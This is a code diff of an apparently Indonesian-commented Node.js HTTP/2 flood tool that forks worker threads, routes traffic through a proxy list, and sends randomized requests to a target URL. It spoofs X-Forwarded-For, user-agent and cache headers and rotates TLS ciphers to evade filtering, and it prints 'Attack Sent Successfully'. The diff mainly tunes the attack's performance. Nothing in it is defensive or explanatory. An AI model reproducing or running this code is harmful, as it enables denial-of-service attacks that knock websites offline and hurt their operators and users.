@@ -22,19 +22,6 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   ],
 
-  cache_header = [
-    'max-age=0',
-    'no-cache',
-    'no-store',
-    'pre-check=0',
-    'post-check=0',
-    'must-revalidate',
-    'proxy-revalidate',
-    's-maxage=604800',
-    'no-cache, no-store,private, max-age=0, must-revalidate',
-    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
-    'no-cache, no-store,private, max-age=604800, must-revalidate',
-  ]
 language_header = [
     'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
     'en-US,en;q=0.5',
@@ -155,14 +142,21 @@ language_header = [
   "TLS_AES_128_CCM_SHA256",
   "TLS_CHACHA20_POLY1305_SHA256",
   "TLS_AES_256_GCM_SHA384",
-  "TLS_AES_128_GCM_SHA256",
-  "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-  "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
-  "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
-  "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-  "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
-  "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256"
-];
+  "TLS_AES_128_GCM_SHA256"
+ ];
+   cache_header = [
+    'max-age=0',
+    'no-cache',
+    'no-store',
+    'pre-check=0',
+    'post-check=0',
+    'must-revalidate',
+    'proxy-revalidate',
+    's-maxage=604800',
+    'no-cache, no-store,private, max-age=0, must-revalidate',
+    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
+    'no-cache, no-store,private, max-age=604800, must-revalidate',
+  ]
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
   process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
@@ -217,12 +211,16 @@ const secureOptions =
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
 
- const MAX_RAM_PERCENTAGE = 99;
-const RESTART_DELAY = 10;
+ const MAX_RAM_PERCENTAGE = 100;
+const RESTART_DELAY = 1000;
 
- if (cluster.isMaster) {
-  console.log(`Attack Successfully Sent`.red)
-  console.log(`--------------------------------------------`.gray)
+if (cluster.isMaster) {
+    console.clear();
+    console.log(`\n[H2-CODESYNTAX]`.brightBlue);
+    console.log(`--------------------------------------------`.gray);
+    console.log(`[+] Attack Sent Successfully`.green);
+    console.log(`[+] Initializing ${args.threads} Threads...`.cyan);
+    console.log(`--------------------------------------------`.gray);
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
@@ -230,7 +228,7 @@ const RESTART_DELAY = 10;
 
         console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
         setTimeout(() => {
-            for (let counter = 0; counter <= args.threads; counter++) {
+            for (let counter = 1; counter <= args.threads; counter++) {
                 cluster.fork();
             }
         }, RESTART_DELAY);
@@ -246,7 +244,7 @@ const RESTART_DELAY = 10;
             restartScript();
         }
     };
-	setInterval(handleRAMUsage, 8000);
+	setInterval(handleRAMUsage, 5000);
 	
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
@@ -337,79 +335,114 @@ const randstrsValue = randstrs(10);
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
-    const ipList = {
-  nm: [
-    "110.0.0.0", "111.0.0.0", "112.0.0.0", "113.0.0.0", "114.0.0.0",
-    "115.0.0.0", "116.0.0.0", "117.0.0.0", "118.0.0.0", "119.0.0.0"
-  ],
-  nmx: [
-    "120.0", "119.0", "118.0", "117.0", "116.0", "115.0", "114.0", "113.0", 
-    "112.0", "111.0"
-  ],
-  nmx1: [
-    "105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0", 
-    "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0"
-  ]
-};
-
-const windowsVersions = [
-  { version: "Windows 1.01", releaseDate: "1985" },
-  { version: "Windows 1.02", releaseDate: "1985" },
-  { version: "Windows 1.03", releaseDate: "1986" },
-  { version: "Windows 1.04", releaseDate: "1987" },
-  { version: "Windows 2.01", releaseDate: "1987" },
-  { version: "Windows 3.0", releaseDate: "1990" },
-  { version: "Windows NT 3.1", releaseDate: "1993" },
-  { version: "Windows NT 3.5", releaseDate: "1994" },
-  { version: "Windows 95", releaseDate: "1995" },
-  { version: "Windows 98", releaseDate: "1998" },
-  { version: "Windows Me", releaseDate: "2000" },
-  { version: "Windows XP", releaseDate: "2001" },
-  { version: "Windows Vista", releaseDate: "2007" },
-  { version: "Windows 7", releaseDate: "2009" },
-  { version: "Windows 8", releaseDate: "2012" },
-  { version: "Windows 10 version 1507", releaseDate: "2015" },
-  { version: "Windows 10 version 1511", releaseDate: "2015" },
-  { version: "Windows 10 version 1607", releaseDate: "2016" },
-  { version: "Windows 10 version 1703", releaseDate: "2017" },
-  { version: "Windows 11", releaseDate: "2021" }
-];
-
-const architectures = {
-  legacy: ["x86-16", "IA-32", "Alpha", "MIPS", "PowerPC"],
-  modern: ["x86_64", "Itanium", "ARMv4", "ARMv5", "ARMv7", "ARM64"]
-};
-
-const windowsServerChannels = [
-  { channel: "2012 R2", releaseType: "Stable" },
-  { channel: "2019 R2", releaseType: "Stable" },
-  { channel: "2012 R2 Datacenter", releaseType: "Datacenter" },
-  { channel: "Server Blue", releaseType: "Preview" },
-  { channel: "Longhorn Server", releaseType: "Preview" },
-  { channel: "Whistler Server", releaseType: "Preview" },
-  { channel: "Shell Release", releaseType: "Special" },
-  { channel: "Daytona", releaseType: "Special" },
-  { channel: "Razzle", releaseType: "Special" },
-  { channel: "HPC 2008", releaseType: "High Performance" }
-];
-const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
-
-const nm1 = randomItem(ipList.nm);
-const nm2 = randomItem(windowsVersions).version;
-const nm3 = randomItem(architectures.modern);
-const nm4 = randomItem(ipList.nmx);
-const nm5 = randomItem(windowsServerChannels).channel;
-const nm6 = randomItem(ipList.nmx1);
+    const nm = [
+      "110.0.0.0",
+      "111.0.0.0",
+      "112.0.0.0",
+      "113.0.0.0",
+      "114.0.0.0",
+      "115.0.0.0",
+      "116.0.0.0",
+      "117.0.0.0",
+      "118.0.0.0",
+      "119.0.0.0",
+      ];
+      const nmx = [
+      "120.0",
+      "119.0",
+      "118.0",
+      "117.0",
+      "116.0",
+      "115.0",
+      "114.0",
+      "113.0",
+      "112.0",
+      "111.0",
+      ];
+      const nmx1 = [
+      "105.0.0.0",
+      "104.0.0.0",
+      "103.0.0.0",
+      "102.0.0.0",
+      "101.0.0.0",
+      "100.0.0.0",
+      "99.0.0.0",
+      "98.0.0.0",
+      "97.0.0.0",
+      ];
+      const sysos = [
+      "Windows 1.01",
+      "Windows 1.02",
+      "Windows 1.03",
+      "Windows 1.04",
+      "Windows 2.01",
+      "Windows 3.0",
+      "Windows NT 3.1",
+      "Windows NT 3.5",
+      "Windows 95",
+      "Windows 98",
+      "Windows 2006",
+      "Windows NT 4.0",
+      "Windows 95 Edition",
+      "Windows 98 Edition",
+      "Windows Me",
+      "Windows Business",
+      "Windows XP",
+      "Windows 7",
+      "Windows 8",
+      "Windows 10 version 1507",
+      "Windows 10 version 1511",
+      "Windows 10 version 1607",
+      "Windows 10 version 1703",
+      ];
+      const winarch = [
+      "x86-16",
+      "x86-16, IA32",
+      "IA-32",
+      "IA-32, Alpha, MIPS",
+      "IA-32, Alpha, MIPS, PowerPC",
+      "Itanium",
+      "x86_64",
+      "IA-32, x86-64",
+      "IA-32, x86-64, ARM64",
+      "x86-64, ARM64",
+      "ARMv4, MIPS, SH-3",
+      "ARMv4",
+      "ARMv5",
+      "ARMv7",
+      "IA-32, x86-64, Itanium",
+      "IA-32, x86-64, Itanium",
+      "x86-64, Itanium",
+      ];
+      const winch = [
+      "2012 R2",
+      "2019 R2",
+      "2012 R2 Datacenter",
+      "Server Blue",
+      "Longhorn Server",
+      "Whistler Server",
+      "Shell Release",
+      "Daytona",
+      "Razzle",
+      "HPC 2008",
+      ];
+      
+       var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
+       var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
+       var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
+       var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
+       var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
+       var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
         const rd = [
-  "221988",
-  "1287172",
-  "87238723",
-  "8737283",
-  "8238232",
-  "63535464",
-  "121212"
-];
-var kha = rd[Math.floor(Math.random() * rd.length)];
+          "221988",
+          "1287172",
+          "87238723",
+          "8737283",
+          "8238232",
+          "63535464",
+          "121212",
+        ];
+         var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
          
   encoding_header = [
     'gzip, deflate, br'
@@ -418,70 +451,80 @@ var kha = rd[Math.floor(Math.random() * rd.length)];
     , 'gzip, identity'
   ];
   function randstrr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-	}
-    function randstr(length) {
-		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-	}
-  function generateRandomString(minLength, maxLength) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
- const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
- const randomStringArray = Array.from({ length }, () => {
-   const randomIndex = Math.floor(Math.random() * characters.length);
-   return characters[randomIndex];
- });
-
- return randomStringArray.join('');
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+    const charactersLength = characters.length;
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += characters[Math.floor(Math.random() * charactersLength)];
+    }
+    return result;
 }
- const val = { 'NEl': JSON.stringify({
-			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
-			"include_subdomains": Math.random() < 0.5 ? true : false}),
-            }
 
-     const rateHeaders = [
-        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
-        {"Access-Control-Request-Method": "CONNECT"},
-        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
-        { "origin": "https://" + parsedTarget.host},
-        { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
-        { "data-return" :"false"},
-        {"X-Forwarded-For" : parsedProxy[0]},
-        {"NEL" : val},
-        {"dnt" : "1" },
-        { "A-IM": "Feed" },
-        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-       {'Delta-Base' : '12340001'},
-       {"te": "trailers"},
-       {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+function randstr(length) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const charactersLength = characters.length;
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += characters[Math.floor(Math.random() * charactersLength)];
+    }
+    return result;
+}
+
+function generateRandomString(minLength, maxLength) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const charactersLength = characters.length;
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+
+    const randomStringArray = Array.from({ length }, () => {
+        return characters[Math.floor(Math.random() * charactersLength)];
+    });
+
+    return randomStringArray.join('');
+}
+ // Helper function untuk memilih elemen acak dari array
+const getRandomItem = (arr, fallback = '') => arr.length ? arr[Math.floor(Math.random() * arr.length)] : fallback;
+
+// Optimisasi pembuatan objek val
+const val = {
+  'NEL': JSON.stringify({
+    report_to: Math.random() < 0.5 ? 'cf-nel' : 'default',
+    'max-age': Math.random() < 0.5 ? 604800 : 2561000,
+    include_subdomains: Math.random() < 0.5
+  })
+};
+
+const rateHeaders = [
+  { 'accept': getRandomItem(accept_header, 'application/json') },
+  { 'Access-Control-Request-Method': 'GET' },
+  { 'accept-language': getRandomItem(language_header, 'en-US') },
+  { 'origin': parsedTarget?.host ? `https://${parsedTarget.host}` : 'https://default-host.com' },
+  { 'source-ip': randstr(5) ?? '127.0.0.1' },
+  // { 'x-aspnet-version': randstrsValue }, // Tetap dikomentari
+  { 'data-return': 'false' },
+  { 'X-Forwarded-For': parsedProxy?.[0] ?? '0.0.0.0' },
+  { 'NEL': val['NEL'] ?? 'default-value' },
+  { 'dnt': '1' },
+  { 'A-IM': 'Feed' },
+  { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
+  { 'Delta-Base': '12340001' },
+  { 'te': 'trailers' },
+  { 'accept-language': getRandomItem(language_header, 'en-US') }
 ];
-let headers = {
-  ":authority": parsedTarget.host,
-  ":scheme": "https",
-  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
-  ":method": "HEAD",
-  "pragma" : "no-cache",
-  "upgrade-insecure-requests" : "1",
-  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
-  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
-  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
-  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
-  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-  "user-agent" :  "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
-}
+
+const headers = {
+  ':authority': parsedTarget?.host ?? 'default-host.com',
+  ':scheme': 'https',
+  ':path': `${parsedTarget?.path ?? '/'}?${randstr(3)}=${generateRandomString(10, 25)}`,
+  ':method': 'GET',
+  'pragma': 'no-cache',
+  'upgrade-insecure-requests': '1',
+  'accept-encoding': getRandomItem(encoding_header, 'gzip, deflate, br'),
+  'cache-control': getRandomItem(cache_header, 'no-cache'),
+  'sec-fetch-mode': getRandomItem(fetch_mode, 'cors'),
+  'sec-fetch-site': getRandomItem(fetch_site, 'same-origin'),
+  'sec-fetch-dest': getRandomItem(fetch_dest, 'document'),
+  'user-agent': `/5.0 (${nm2}; ${nm5}; ${nm3}; ${kha} ${nm4}) /Gecko/20100101 Edg/91.0.864.59 ${nm4}`
+};
  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
@@ -504,13 +547,13 @@ let headers = {
     const tlsOptions = {
        port: parsedPort,
        secure: true,
-       ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45', 'h3-29', 'h3-28', 'h3-27'],
+       ALPNProtocols: ["h2"],
        ciphers: cipper,
        sigalgs: sigalgs,
        requestCert: true,
        socket: connection,
        ecdhCurve: ecdhCurve,
-       honorCipherOrder: true,
+       honorCipherOrder: false,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext :secureContext,
